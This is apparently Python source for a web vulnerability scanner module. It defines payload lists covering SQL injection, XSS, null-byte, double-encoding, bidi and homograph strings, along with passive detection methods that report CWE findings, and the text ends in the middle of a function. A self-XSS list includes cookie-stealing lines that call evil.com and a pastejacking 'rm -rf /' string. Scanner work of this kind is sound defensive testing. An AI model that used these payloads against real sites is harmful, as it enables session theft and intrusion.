"""
Chaos Teen Analyzer - TEENAGE HACKER CHAOS MINDSET.

Think like a creative teenager trying to BREAK EVERYTHING.
Unconventional, weird, "what if I try THIS?" attack patterns.
The crazier the better. Tests edge cases developers never considered.
"""

from __future__ import annotations

import re
import urllib.parse
from typing import Any, Final

from secureprobe.analyzers.base import BaseAnalyzer
from secureprobe.models import AnalyzerType, Finding, Severity


class ChaosTeenAnalyzer(BaseAnalyzer):
    """
    TEENAGE HACKER CHAOS MINDSET analyzer.

    Implements 15 unconventional attack vectors that exploit:
    - Parser inconsistencies
    - Encoding edge cases
    - Memory boundary violations
    - Type confusion
    - Protocol downgrade attacks
    - Unicode/emoji chaos

    These are the attacks a creative teenager would try - weird,
    unexpected, and targeting developer blind spots.
    """

    analyzer_type = AnalyzerType.CHAOS_TEEN

    # ============================================================
    # 1. EMOJI INJECTION - Weird Unicode in SQL/XSS payloads
    # CWE-89 (SQLi), CWE-79 (XSS) via Unicode bypass
    # ============================================================
    EMOJI_PAYLOADS: Final[list[str]] = [
        # SQL injection with emoji obfuscation
        "💀' OR '1'='1",
        "👻; DROP TABLE users;--",
        "🔥 UNION SELECT * FROM passwords 💥",
        "' OR 1=1--💀",
        "admin'--🎃",
        # XSS with emoji
        "<script>alert('💀')</script>",
        "<img src=x onerror='alert(\"🔥\")'>",
        "javascript:alert('👻')",
        # UTF-8 BOM attack
        "\xef\xbb\xbf<script>alert(1)</script>",
        # Overlong UTF-8 sequences
        "\xc0\xbc" + "script>alert(1)</script>",  # Overlong < encoding
        # Emoji ZWJ sequences that confuse parsers
        "👨‍💻<script>alert(1)</script>",
        "🏳️‍🌈' OR '1'='1",
    ]

    # ============================================================
    # 2. NULL BYTE MADNESS - Inject %00, \x00 everywhere
    # CWE-626: Null Byte Interaction Error
    # ============================================================
    NULL_BYTE_PAYLOADS: Final[list[str]] = [
        "%00",
        "\x00",
        "%00%00%00",
        "test.php%00.jpg",  # Classic null byte file extension bypass
        "admin%00@evil.com",  # Email validation bypass
        "../../../etc/passwd%00",  # Path traversal + null byte
        "user%00admin",  # Username null truncation
        "'%00OR%00'1'='1",  # SQL injection with null bytes
        "<script>%00alert(1)</script>",  # XSS with null bytes
        "data:text/html%00,<script>alert(1)</script>",
        "file:///etc/passwd%00",
        "test\x00.exe",  # Binary null byte
        "\x00\x00\x00\x00SELECT",  # Multiple null prefix
    ]

    # ============================================================
    # 3. BACKWARDS PAYLOAD - Reversed payloads some parsers miss
    # CWE-20: Improper Input Validation
    # ============================================================
    BACKWARDS_PAYLOADS: Final[list[str]] = [
        ">tpircs/<)1(trela>tpircs<",  # <script>alert(1)</script> reversed
        "1=1' RO '",  # ' OR '1'='1 reversed
        ">\"x\"=crs gmi<",  # <img src="x"> reversed
        "lmth/txet:atad",  # data:text/html reversed
        ">pmorp/<REWSNAEHT>pmorp<",  # prompt reversed
        "nosaj/noitacilppa",  # application/json reversed
        ">gnorts/<TPIRCSAVAJ>gnorts<",  # strong javascript reversed
    ]

    # ============================================================
    # 4. MIXED CASE CHAOS - Bypass case-sensitive filters
    # CWE-178: Improper Handling of Case Sensitivity
    # ============================================================
    MIXED_CASE_PAYLOADS: Final[list[str]] = [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<sCrIpT>alert(1)</ScRiPt>",
        "sElEcT * fRoM uSeRs",
        "uNiOn SeLeCt * FrOm PaSsWoRdS",
        "<ImG sRc=x OnErRoR=alert(1)>",
        "<bOdY oNlOaD=alert(1)>",
        "<iNpUt OnFoCuS=alert(1) aUtOfOcUs>",
        "<sVg OnLoAd=alert(1)>",
        "jAvAsCrIpT:alert(1)",
        "dAtA:TeXt/HtMl,<ScRiPt>alert(1)</ScRiPt>",
        "<oBjEcT dAtA='javascript:alert(1)'>",
        "OnClIcK=alert(1)",
        "OnMoUsEoVeR=alert(1)",
    ]

    # ============================================================
    # 5. DOUBLE ENCODING NIGHTMARE - %25XX for decode-once filters
    # CWE-173: Improper Handling of Alternate Encoding
    # ============================================================
    DOUBLE_ENCODING_PAYLOADS: Final[list[str]] = [
        # Double URL encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",  # <script>alert(1)</script>
        "%252F..%252F..%252Fetc%252Fpasswd",  # /../../../etc/passwd
        "%2527%2520OR%25201%253D1",  # ' OR 1=1
        # Triple encoding
        "%25253Cscript%25253E",
        # Mixed double encoding
        "%253C%73cript%253Ealert(1)%253C/script%253E",
        # HTML entity + URL encoding
        "%26lt%3Bscript%26gt%3Balert(1)",
        # Unicode + URL encoding
        "%25u003Cscript%25u003E",
        # Double encoding path traversal
        "%252e%252e%252f",  # ../
        "%252e%252e%255c",  # ..\
    ]

    # ============================================================
    # 6. WHITESPACE ABUSE - Tabs, form feeds, zero-width chars
    # CWE-20: Improper Input Validation
    # ============================================================
    WHITESPACE_PAYLOADS: Final[list[str]] = [
        # SQL with whitespace obfuscation
        "SELECT\t*\tFROM\tusers",
        "SELECT\x0b*\x0bFROM\x0busers",  # Vertical tab
        "SELECT\x0c*\x0cFROM\x0cusers",  # Form feed
        "SELECT/**//**/FROM/**/users",  # SQL comment whitespace
        # XSS with whitespace
        "<script\t>alert(1)</script\t>",
        "<script\x0b>alert(1)</script>",
        "<script\x0c>alert(1)</script>",
        "<img\tsrc=x\tonerror=alert(1)>",
        # Zero-width characters
        "SE\u200bLECT\u200b*\u200bFROM",  # Zero-width space
        "SE\ufeffLECT",  # BOM character
        "<scr\u200bipt>",  # Script with ZWSP
        "<img\u00a0src=x>",  # Non-breaking space
        "ad\u200dmin",  # Zero-width joiner in username
        # Mongolian vowel separator
        "admin\u180etest",
        # Line separator
        "admin\u2028test",
        # Paragraph separator
        "admin\u2029test",
    ]

    # ============================================================
    # 7. HTTP/0.9 DOWNGRADE - Ancient protocol bypass
    # CWE-757: Selection of Less-Secure Algorithm During Negotiation
    # ============================================================
    HTTP09_PATTERNS: Final[list[str]] = [
        "GET /",  # Raw HTTP/0.9 - no version specified
        "GET /admin\r\n",  # HTTP/0.9 with path
        "\r\nGET / HTTP/0.9\r\n",  # Explicit 0.9
    ]

    # ============================================================
    # 8. NEGATIVE ARRAY INDEX - Access memory before array
    # CWE-125: Out-of-bounds Read
    # ============================================================
    NEGATIVE_INDEX_PAYLOADS: Final[list[str]] = [
        "[-1]",
        "[-99999]",
        "[-2147483648]",  # INT_MIN
        "item[-1]",
        "array[-999999999]",
        "[~0]",  # Bitwise NOT of 0 = -1
        "[-0x7FFFFFFF]",  # Negative max int hex
        "items[-1:-5]",  # Negative slice
        "data[:-99999]",
        "obj[-1]['password']",
    ]

    # ============================================================
    # 9. EXCESSIVELY LONG VALUES - Break buffer limits
    # CWE-119: Improper Restriction of Operations within Bounds
    # ============================================================
    LONG_VALUE_LENGTHS: Final[list[int]] = [
        1000,
        10000,
        100000,
        1000000,  # 1 million char payload
    ]

    LONG_VALUE_TEMPLATES: Final[list[str]] = [
        "A" * 1000,  # Simple repeated char
        "username=" + "admin" * 200,
        "id=" + "1" * 10000,
        "search=" + "%20" * 5000,  # Repeated URL encoding
        "file=" + "../" * 3000,  # Path traversal overrun
        "cookie=" + "session=x;" * 1000,  # Cookie overflow
        "json={" + '"a":"' + "x" * 50000 + '"}',  # JSON payload bomb
    ]

    # ============================================================
    # 10. TYPE JUGGLING PHP - Exploit loose comparison
    # CWE-1024: Comparison with Incompatible Types
    # ============================================================
    TYPE_JUGGLING_PAYLOADS: Final[list[str]] = [
        # Magic hashes that equal 0 in PHP loose comparison
        "0e462097431906509019562988736854",  # MD5 magic hash
        "0e215962017",  # Type juggling == 0
        "0e1234567890",
        # Array bypass
        "[]",
        "user[]",
        "password[]",
        "username[]=admin",
        # Type confusion
        "true",
        "false",
        "null",
        "NULL",
        "None",
        "undefined",
        "NaN",
        "Infinity",
        "-Infinity",
        # Integer overflow to string
        "9999999999999999999999999",
        # Float edge cases
        "0.0",
        "0.00000001",
        "-0",
        "1e308",  # Near max float
        "1e-308",  # Near min positive float
        # JSON type confusion
        '{"admin": true}',
        '{"role": ["admin"]}',
    ]

    # ============================================================
    # 11. TIME ZONE BOMBS - Extreme dates break parsers
    # CWE-1286: Improper Validation of Syntactic Correctness
    # ============================================================
    TIMEZONE_BOMB_PAYLOADS: Final[list[str]] = [
        # Extreme years
        "9999-12-31",
        "0001-01-01",
        "0000-00-00",
        "-0001-01-01",  # Negative year
        "99999-01-01",  # 5-digit year
        # Invalid dates
        "2024-13-45",  # Invalid month/day
        "2024-02-30",  # February 30
        "2024-00-00",
        # Negative timestamps
        "-1",
        "-62135596800",  # Before Unix epoch
        "-9999999999999",
        # Overflow timestamps
        "2147483647",  # INT_MAX (Y2K38)
        "2147483648",  # INT_MAX + 1
        "9999999999999",
        "99999999999999999",
        # Edge case formats
        "1970-01-01T00:00:00.000000000000Z",  # Nanoseconds overflow
        "T23:59:59.999999999Z",  # Time only
        "2024-W99-9",  # Invalid ISO week
        # Timezone chaos
        "2024-01-01T00:00:00+99:99",
        "2024-01-01T00:00:00-25:00",
        "2024-01-01T00:00:00+00:00:00:00",
    ]

    # ============================================================
    # 12. RIGHT-TO-LEFT OVERRIDE - Flip displayed text
    # CWE-838: Inappropriate Encoding for Output Context
    # ============================================================
    RTL_OVERRIDE_PAYLOADS: Final[list[str]] = [
        "\u202eevil.exe",  # RLO: displays as "exe.live"
        "\u202ePDF.exe",  # Displays as "exe.FDP"
        "legit\u202efdp.exe",  # Looks like legit.pdf
        "\u202egpj.exe",  # Looks like exe.jpg
        "document\u202etxt.exe",  # document + RLO + txt.exe
        # Bidirectional override attacks
        "\u202a\u202b\u202c\u202d\u202e" + "test",  # All bidi controls
        # Isolate overrides
        "\u2066evil\u2069",  # First strong isolate
        "\u2067evil\u2069",  # Right-to-left isolate
        # Pop directional formatting
        "\u202cpayload",
        # Bidi embedding
        "admin\u202enimdA",  # admin + RLO + Admin reversed
    ]

    # ============================================================
    # 13. HOMOGRAPH ATTACKS - Lookalike Unicode chars
    # CWE-1007: Insufficient Visual Distinction
    # ============================================================
    HOMOGRAPH_PAYLOADS: Final[list[str]] = [
        # Cyrillic lookalikes
        "\u0430dmin",  # Cyrillic 'a' in admin
        "p\u0430ypal.com",  # Cyrillic 'a' in paypal
        "\u0440oot",  # Cyrillic 'p' (looks like p) + oot = root
        "g\u043egle.com",  # Cyrillic 'o' in google
        "\u0430\u0440\u0440le.com",  # Cyrillic in apple
        # Greek lookalikes
        "\u0391dmin",  # Greek Alpha
        "\u039f\u03a1ACLE",  # Greek O and P for ORACLE
        # Math symbols lookalikes
        "\u2212admin",  # Math minus sign
        "admin\u2032",  # Prime symbol (looks like ')
        # Full-width characters
        "\uff41\uff44\uff4d\uff49\uff4e",  # Full-width "admin"
        # Subscript/superscript
        "admin\u00b9",  # Superscript 1
        "root\u00b2",  # Superscript 2
        # Combining characters
        "a\u0300dmin",  # 'a' with combining grave accent
        "admin\u0308",  # With combining diaeresis
    ]

    # ============================================================
    # 14. SELF-XSS CHAINING - Escalate via CSRF/social engineering
    # CWE-79: Cross-site Scripting (Self-XSS context)
    # ============================================================
    SELF_XSS_PAYLOADS: Final[list[str]] = [
        # Dev console paste attacks
        "javascript:(function(){document.body.innerHTML='<h1>Hacked</h1>'})();",
        "javascript:alert(document.cookie)",
        # Bookmark injection
        "javascript:void(fetch('//evil.com/steal?c='+document.cookie))",
        # Console pastejacking
        'copy("rm -rf /"); // actually copies malicious command',
        # URL bar attacks
        "data:text/html,<script>alert(document.domain)</script>",
        # PDF JavaScript
        "this.submitForm('http://evil.com/steal?c='+app.doc.URL)",
        # SVG with script
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        # Self-XSS that stores in localStorage
        "localStorage.setItem('payload','<script>alert(1)</script>')",
    ]

    # ============================================================
    # 15. MATH OVERFLOW EVERYWHERE - Integer/float bombs
    # CWE-190: Integer Overflow or Wraparound
    # ============================================================
    MATH_OVERFLOW_PAYLOADS: Final[list[str]] = [
        # Integer boundaries
        "2147483647",  # INT_MAX (32-bit)
        "2147483648",  # INT_MAX + 1
        "-2147483648",  # INT_MIN (32-bit)
        "-2147483649",  # INT_MIN - 1
        "9223372036854775807",  # INT64_MAX
        "9223372036854775808",  # INT64_MAX + 1
        "-9223372036854775808",  # INT64_MIN
        # Unsigned boundaries
        "4294967295",  # UINT_MAX (32-bit)
        "4294967296",  # UINT_MAX + 1
        "18446744073709551615",  # UINT64_MAX
        "18446744073709551616",  # UINT64_MAX + 1
        # Float edge cases
        "1.7976931348623157e+308",  # DBL_MAX
        "2.2250738585072014e-308",  # DBL_MIN
        "0.0000000000000001",
        "99999999999.99999999",
        # Infinity and special values
        "Infinity",
        "-Infinity",
        "NaN",
        "1e309",  # Overflow to Infinity
        "1e-324",  # Underflow
        # Powers of 2 boundaries
        str(2**31),
        str(2**32),
        str(2**63),
        str(2**64),
        str(-(2**31)),
        str(-(2**63)),
        # Division edge cases
        "0",
        "-0",
        "0.0",
        "-0.0",
    ]

    async def analyze(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Execute TEENAGE HACKER CHAOS analysis.

        Tests all 15 crazy attack patterns to find edge cases
        developers never considered.
        """
        findings: list[Finding] = []
        html_content = page_data.get("html", "")
        scripts = page_data.get("scripts", [])
        forms = page_data.get("forms", [])
        headers = page_data.get("headers", {})
        cookies = page_data.get("cookies", [])
        scan_mode = page_data.get("scan_mode", "passive")

        # Passive analysis - detect vulnerabilities to these patterns
        findings.extend(self._analyze_emoji_injection_vuln(url, html_content))
        findings.extend(self._analyze_null_byte_vuln(url, html_content, headers))
        findings.extend(self._analyze_case_sensitivity_vuln(url, html_content))
        findings.extend(self._analyze_encoding_handling(url, html_content, headers))
        findings.extend(self._analyze_whitespace_handling(url, html_content))
        findings.extend(self._analyze_protocol_support(url, headers))
        findings.extend(self._analyze_array_access_vuln(url, html_content, scripts))
        findings.extend(self._analyze_length_limits(url, forms))
        findings.extend(self._analyze_type_handling(url, html_content, scripts))
        findings.extend(self._analyze_date_handling(url, html_content))
        findings.extend(self._analyze_rtl_vuln(url, html_content))
        findings.extend(self._analyze_homograph_vuln(url, html_content))
        findings.extend(self._analyze_self_xss_vuln(url, html_content, scripts))
        findings.extend(self._analyze_math_overflow_vuln(url, html_content, scripts))

        # Active mode - deeper testing
        if scan_mode == "active":
            findings.extend(self._active_chaos_tests(url, page_data))

        return findings

    def _analyze_emoji_injection_vuln(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """Detect vulnerability to emoji/Unicode injection attacks."""
        findings: list[Finding] = []

        # Check if emoji characters appear unfiltered in output
        emoji_patterns = [
            r"[\U0001F600-\U0001F64F]",  # Emoticons
            r"[\U0001F300-\U0001F5FF]",  # Misc symbols
            r"[\U0001F680-\U0001F6FF]",  # Transport/map symbols
            r"[\U0001F1E0-\U0001F1FF]",  # Flags
        ]

        emoji_found = []
        for pattern in emoji_patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                emoji_found.extend(matches[:3])

        # Check for unescaped special Unicode sequences
        unicode_escapes = re.findall(r"\\u[0-9a-fA-F]{4}", html_content)

        if emoji_found or unicode_escapes:
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Unicode/Emoji Content Handling Detected",
                    description=(
                        "Page handles Unicode emoji or escape sequences. "
                        "This could be exploited for parser confusion or filter bypass. "
                        f"Found {len(emoji_found)} emoji chars, {len(unicode_escapes)} Unicode escapes."
                    ),
                    cwe_id="CWE-176",
                    cwe_name="Improper Handling of Unicode Encoding",
                    url=url,
                    evidence=f"Emoji: {emoji_found[:5]}, Escapes: {unicode_escapes[:5]}",
                    remediation=(
                        "Normalize Unicode input before processing. "
                        "Strip or encode emoji in security-sensitive contexts. "
                        "Validate input against expected character sets."
                    ),
                    cvss_score=3.1,
                    metadata={
                        "attack_type": "emoji_injection",
                        "payloads": self.EMOJI_PAYLOADS[:5],
                    },
                )
            )

        return findings

    def _analyze_null_byte_vuln(
        self,
        url: str,
        html_content: str,
        headers: dict[str, str],
    ) -> list[Finding]:
        """Detect vulnerability to null byte injection."""
        findings: list[Finding] = []

        # Check for null byte handling in URL
        if "%00" in url or "\x00" in url:
            findings.append(
                self._create_finding(
                    severity=Severity.HIGH,
                    title="Null Byte in URL Accepted",
                    description=(
                        "The application accepts null bytes in URLs. "
                        "This can be exploited for file extension bypass, "
                        "path truncation, and filter evasion attacks."
                    ),
                    cwe_id="CWE-626",
                    cwe_name="Null Byte Interaction Error",
                    url=url,
                    evidence=f"URL contains null byte: {url[:100]}",
                    remediation=(
                        "Strip null bytes from all input. "
                        "Validate file extensions after null byte removal. "
                        "Use allowlisting for expected characters."
                    ),
                    cvss_score=7.5,
                    metadata={
                        "attack_type": "null_byte_injection",
                        "payloads": self.NULL_BYTE_PAYLOADS[:5],
                    },
                )
            )

        # Check for null bytes in response (indicates processing)
        if "\x00" in html_content:
            findings.append(
                self._create_finding(
                    severity=Severity.MEDIUM,
                    title="Null Byte in Response Content",
                    description=(
                        "Response contains null bytes, indicating the "
                        "application may not properly sanitize binary data. "
                        "This could enable null byte poisoning attacks."
                    ),
                    cwe_id="CWE-626",
                    cwe_name="Null Byte Interaction Error",
                    url=url,
                    evidence="Null bytes found in HTML response",
                    remediation="Sanitize output to remove null bytes.",
                    cvss_score=5.3,
                )
            )

        return findings

    def _analyze_case_sensitivity_vuln(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """Detect case-sensitive filter vulnerabilities."""
        findings: list[Finding] = []

        # Look for case-sensitive patterns in scripts/HTML that could be bypassed
        case_sensitive_patterns = [
            (r"script", "script tag filter"),
            (r"onclick", "event handler filter"),
            (r"javascript:", "javascript protocol filter"),
            (r"select.*from", "SQL keyword filter"),
        ]

        for pattern, filter_name in case_sensitive_patterns:
            lowercase_matches = len(re.findall(pattern, html_content, re.IGNORECASE))
            exact_matches = len(re.findall(pattern, html_content))

            # If there are case-insensitive matches but not exact, might be filtered
            if lowercase_matches > 0 and lowercase_matches != exact_matches:
                findings.append(
                    self._create_finding(
                        severity=Severity.LOW,
                        title=f"Case-Sensitive {filter_name.title()} Detected",
                        description=(
                            f"Content filtering for '{pattern}' may be case-sensitive. "
                            "Mixed case payloads like 'ScRiPt' could bypass filters."
                        ),
                        cwe_id="CWE-178",
                        cwe_name="Improper Handling of Case Sensitivity",
                        url=url,
                        evidence=f"Pattern: {pattern}, Matches: {lowercase_matches} vs {exact_matches}",
                        remediation="Use case-insensitive comparison for security filters.",
                        cvss_score=3.7,
                        metadata={
                            "attack_type": "mixed_case_chaos",
                            "bypass_payloads": self.MIXED_CASE_PAYLOADS[:5],
                        },
                    )
                )

        return findings

    def _analyze_encoding_handling(
        self,
        url: str,
        html_content: str,
        headers: dict[str, str],
    ) -> list[Finding]:
        """Detect vulnerability to double/triple encoding attacks."""
        findings: list[Finding] = []

        # Check for URL-encoded content in response (might indicate decode-once)
        url_encoded_patterns = [
            r"%[0-9a-fA-F]{2}",  # URL encoding
            r"%25[0-9a-fA-F]{2}",  # Double encoding
        ]

        single_encoded = len(re.findall(url_encoded_patterns[0], html_content))
        double_encoded = len(re.findall(url_encoded_patterns[1], html_content))

        if double_encoded > 0:
            findings.append(
                self._create_finding(
                    severity=Severity.MEDIUM,
                    title="Double URL Encoding Present in Response",
                    description=(
                        f"Found {double_encoded} instances of double URL encoding in response. "
                        "This suggests the application may decode only once, "
                        "making it vulnerable to double-encoding bypass attacks."
                    ),
                    cwe_id="CWE-173",
                    cwe_name="Improper Handling of Alternate Encoding",
                    url=url,
                    evidence=f"Double encoded: {double_encoded}, Single: {single_encoded}",
                    remediation=(
                        "Recursively decode input until no encoding remains. "
                        "Canonicalize input before security validation. "
                        "Implement encoding-aware WAF rules."
                    ),
                    cvss_score=5.3,
                    metadata={
                        "attack_type": "double_encoding_nightmare",
                        "payloads": self.DOUBLE_ENCODING_PAYLOADS[:5],
                    },
                )
            )

        return findings

    def _analyze_whitespace_handling(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """Detect vulnerability to whitespace obfuscation."""
        findings: list[Finding] = []

        # Check for unusual whitespace characters
        unusual_whitespace = {
            "\x0b": "vertical tab",
            "\x0c": "form feed",
            "\u200b": "zero-width space",
            "\ufeff": "BOM",
            "\u00a0": "non-breaking space",
            "\u180e": "Mongolian vowel separator",
            "\u2028": "line separator",
            "\u2029": "paragraph separator",
        }

        found_whitespace = []
        for char, name in unusual_whitespace.items():
            if char in html_content:
                found_whitespace.append(name)

        if found_whitespace:
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Unusual Whitespace Characters in Response",
                    description=(
                        f"Response contains unusual whitespace: {', '.join(found_whitespace)}. "
                        "These characters can be used to obfuscate payloads "
                        "and bypass filters that only check standard spaces."
                    ),
                    cwe_id="CWE-20",
                    cwe_name="Improper Input Validation",
                    url=url,
                    evidence=f"Found: {', '.join(found_whitespace[:5])}",
                    remediation=(
                        "Normalize all Unicode whitespace variants to standard space. "
                        "Strip or reject unusual whitespace in security-sensitive contexts."
                    ),
                    cvss_score=3.1,
                    metadata={
                        "attack_type": "whitespace_abuse",
                        "payloads": self.WHITESPACE_PAYLOADS[:5],
                    },
                )
            )

        return findings

    def _analyze_protocol_support(
        self,
        url: str,
        headers: dict[str, str],
    ) -> list[Finding]:
        """Detect HTTP/0.9 or legacy protocol support."""
        findings: list[Finding] = []

        # Check server header for old versions
        server = headers.get("server", "").lower()
        old_servers = ["apache/1.", "iis/5", "iis/6", "nginx/0."]

        for old_server in old_servers:
            if old_server in server:
                findings.append(
                    self._create_finding(
                        severity=Severity.MEDIUM,
                        title="Legacy Server Version Detected",
                        description=(
                            f"Server version '{server}' may support HTTP/0.9 "
                            "and other legacy protocols with security weaknesses."
                        ),
                        cwe_id="CWE-757",
                        cwe_name="Selection of Less-Secure Algorithm During Negotiation",
                        url=url,
                        evidence=f"Server: {server}",
                        remediation=(
                            "Upgrade to modern server version. "
                            "Disable HTTP/0.9 support. "
                            "Require HTTP/1.1 or higher."
                        ),
                        cvss_score=4.3,
                        metadata={
                            "attack_type": "http09_downgrade",
                            "payloads": self.HTTP09_PATTERNS,
                        },
                    )
                )
                break

        return findings

    def _analyze_array_access_vuln(
        self,
        url: str,
        html_content: str,
        scripts: list[Any],
    ) -> list[Finding]:
        """Detect potential negative array index vulnerabilities."""
        findings: list[Finding] = []

        all_content = html_content
        for script in scripts:
            if isinstance(script, str):
                all_content += "\n" + script

        # Look for array access patterns without bounds checking
        array_patterns = [
            r"\[\s*\w+\s*\]",  # [variable] access
            r"\[\s*-?\d+\s*\]",  # [number] access
            r"\.get\s*\(\s*\w+\s*\)",  # .get(variable)
            r"\.at\s*\(\s*-?\d+\s*\)",  # .at(-1) - negative indexing
        ]

        array_accesses = []
        for pattern in array_patterns:
            matches = re.findall(pattern, all_content)
            array_accesses.extend(matches[:3])

        # Check for negative index handling
        negative_index_pattern = r"\[\s*-\d+\s*\]"
        negative_matches = re.findall(negative_index_pattern, all_content)

        if negative_matches:
            findings.append(
                self._create_finding(
                    severity=Severity.MEDIUM,
                    title="Negative Array Indexing Detected",
                    description=(
                        f"Code uses negative array indices: {negative_matches[:3]}. "
                        "Without proper bounds checking, this could access unintended memory."
                    ),
                    cwe_id="CWE-125",
                    cwe_name="Out-of-bounds Read",
                    url=url,
                    evidence=f"Negative indices: {negative_matches[:5]}",
                    remediation=(
                        "Validate array indices are within bounds. "
                        "Use safe access methods like .at() with bounds checking."
                    ),
                    cvss_score=5.3,
                    metadata={
                        "attack_type": "negative_array_index",
                        "payloads": self.NEGATIVE_INDEX_PAYLOADS,
                    },
                )
            )

        return findings

    def _analyze_length_limits(
        self,
        url: str,
        forms: list[dict[str, Any]],
    ) -> list[Finding]:
        """Detect missing length limits on form inputs."""
        findings: list[Finding] = []

        unlimited_inputs = []

        for form in forms:
            if not isinstance(form, dict):
                continue

            inputs = form.get("inputs", [])
            form_id = form.get("id", "") or form.get("action", "unknown")

            for input_field in inputs:
                if not isinstance(input_field, dict):
                    continue

                input_type = input_field.get("type", "text").lower()
                name = input_field.get("name", "unknown")

                # Text-like inputs without maxlength
                if input_type in ["text", "password", "email", "search", "tel", "url"]:
                    # We can't detect maxlength from this data, but flag it
                    unlimited_inputs.append(f"{form_id}:{name}")

        if unlimited_inputs:
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Text Inputs May Lack Length Limits",
                    description=(
                        f"Found {len(unlimited_inputs)} text input fields. "
                        "If these lack maxlength attribute, they may be vulnerable "
                        "to buffer overflow via excessively long input."
                    ),
                    cwe_id="CWE-119",
                    cwe_name="Improper Restriction of Operations within Bounds of Memory Buffer",
                    url=url,
                    evidence=f"Inputs: {unlimited_inputs[:5]}",
                    remediation=(
                        "Set maxlength attribute on all text inputs. "
                        "Enforce length limits server-side. "
                        "Test with extremely long values (1M+ chars)."
                    ),
                    cvss_score=3.1,
                    metadata={
                        "attack_type": "excessively_long_values",
                        "test_lengths": self.LONG_VALUE_LENGTHS,
                    },
                )
            )

        return findings

    def _analyze_type_handling(
        self,
        url: str,
        html_content: str,
        scripts: list[Any],
    ) -> list[Finding]:
        """Detect PHP-style type juggling vulnerabilities."""
        findings: list[Finding] = []

        all_content = html_content
        for script in scripts:
            if isinstance(script, str):
                all_content += "\n" + script

        # Check for loose comparison patterns (PHP-style)
        loose_comparison_patterns = [
            r"==\s*['\"]0e\d+['\"]",  # Magic hash comparison
            r"==\s*true",  # Boolean comparison
            r"==\s*false",
            r"==\s*null",
            r"==\s*\[\]",  # Array comparison
        ]

        type_juggling_risks = []
        for pattern in loose_comparison_patterns:
            if re.search(pattern, all_content, re.IGNORECASE):
                type_juggling_risks.append(pattern)

        # Check for PHP indicators
        php_indicators = [
            r"\.php",
            r"<\?php",
            r"PHPSESSID",
        ]

        is_php = any(
            re.search(p, all_content + url, re.IGNORECASE)
            for p in php_indicators
        )

        if is_php:
            findings.append(
                self._create_finding(
                    severity=Severity.MEDIUM,
                    title="PHP Application Detected - Type Juggling Risk",
                    description=(
                        "PHP application detected. PHP's loose comparison (==) "
                        "is vulnerable to type juggling attacks using magic hashes, "
                        "array injection, and type confusion."
                    ),
                    cwe_id="CWE-1024",
                    cwe_name="Comparison Using Wrong Factors",
                    url=url,
                    evidence="PHP indicators found in response/URL",
                    remediation=(
                        "Use strict comparison (===) instead of loose (==). "
                        "Validate types explicitly before comparison. "
                        "Use password_verify() for password comparison."
                    ),
                    cvss_score=5.3,
                    metadata={
                        "attack_type": "type_juggling_php",
                        "payloads": self.TYPE_JUGGLING_PAYLOADS[:10],
                    },
                )
            )

        return findings

    def _analyze_date_handling(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """Detect date parsing vulnerabilities."""
        findings: list[Finding] = []

        # Look for date input fields
        date_patterns = [
            r'type\s*=\s*["\']date["\']',
            r'type\s*=\s*["\']datetime["\']',
            r'type\s*=\s*["\']datetime-local["\']',
            r'name\s*=\s*["\'][^"\']*(?:date|time|timestamp)[^"\']*["\']',
        ]

        date_inputs = []
        for pattern in date_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            date_inputs.extend(matches)

        if date_inputs:
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Date Input Fields Detected - Timezone Bomb Risk",
                    description=(
                        f"Found {len(date_inputs)} date/time input fields. "
                        "These should be tested with extreme dates (year 9999, "
                        "year 0001), negative timestamps, and timezone edge cases."
                    ),
                    cwe_id="CWE-1286",
                    cwe_name="Improper Validation of Syntactic Correctness of Input",
                    url=url,
                    evidence=f"Date inputs: {date_inputs[:5]}",
                    remediation=(
                        "Validate date ranges server-side. "
                        "Handle timezone edge cases explicitly. "
                        "Use epoch time with bounds checking."
                    ),
                    cvss_score=2.7,
                    metadata={
                        "attack_type": "timezone_bombs",
                        "payloads": self.TIMEZONE_BOMB_PAYLOADS[:10],
                    },
                )
            )

        return findings

    def _analyze_rtl_vuln(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """Detect vulnerability to RTL override attacks."""
        findings: list[Finding] = []

        # Check for RTL override characters in content
        rtl_chars = {
            "\u202e": "RLO (Right-to-Left Override)",
            "\u202d": "LRO (Left-to-Right Override)",
            "\u202c": "PDF (Pop Directional Formatting)",
            "\u202a": "LRE (Left-to-Right Embedding)",
            "\u202b": "RLE (Right-to-Left Embedding)",
            "\u2066": "LRI (Left-to-Right Isolate)",
            "\u2067": "RLI (Right-to-Left Isolate)",
            "\u2068": "FSI (First Strong Isolate)",
            "\u2069": "PDI (Pop Directional Isolate)",
        }

        found_rtl = []
        for char, name in rtl_chars.items():
            if char in html_content:
                found_rtl.append(name)

        if found_rtl:
            findings.append(
                self._create_finding(
                    severity=Severity.MEDIUM,
                    title="Bidirectional Override Characters Present",
                    description=(
                        f"Found RTL/bidi override characters: {', '.join(found_rtl)}. "
                        "These can make malicious content appear safe by reversing "
                        "displayed text (e.g., 'exe.pdf' appears as 'pdf.exe')."
                    ),
                    cwe_id="CWE-838",
                    cwe_name="Inappropriate Encoding for Output Context",
                    url=url,
                    evidence=f"Bidi chars: {', '.join(found_rtl)}",
                    remediation=(
                        "Strip bidi override characters from user input. "
                        "Validate filenames character-by-character. "
                        "Display filenames in a bidi-neutral context."
                    ),
                    cvss_score=5.3,
                    metadata={
                        "attack_type": "rtl_override",
                        "payloads": self.RTL_OVERRIDE_PAYLOADS,
                    },
                )
            )

        # Check for file upload forms (high RTL risk)
        if re.search(r'type\s*=\s*["\']file["\']', html_content, re.IGNORECASE):
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="File Upload Present - RTL Attack Surface",
                    description=(
                        "File upload detected. Filenames with RTL override "
                        "characters can disguise malicious files as safe types "
